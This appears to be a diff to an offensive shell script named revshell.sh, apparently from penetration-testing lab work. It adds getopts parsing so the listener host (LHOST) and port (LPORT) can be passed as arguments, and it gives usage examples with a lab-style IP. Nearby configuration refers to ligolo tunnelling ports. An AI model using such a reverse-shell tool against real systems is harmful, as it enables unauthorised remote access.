@@ -14,7 +14,10 @@
 # ==============================================================================
 
 # ==============================================================================
-# CONFIGURATION - edit before deploying
+# CONFIGURATION - pass as arguments or fall back to defaults
+# Usage:
+#   ./revshell.sh -h 10.10.14.5 -p 9999
+#   ./revshell.sh -h 10.10.14.5        (uses default port)
 # ==============================================================================
 LHOST="10.10.10.10"
 LPORT=9999
@@ -22,6 +25,14 @@ TIMEOUT=5
 WORKDIR="/tmp"
 LIGOLO_PORT=11601
 LIGOLO_PORT_FALLBACK=443
+
+while getopts "h:p:" opt; do
+    case $opt in
+        h) LHOST="$OPTARG" ;;
+        p) LPORT="$OPTARG" ;;
+        *) ;;
+    esac
+done
 
 # ==============================================================================
 # WORKING DIRECTORY
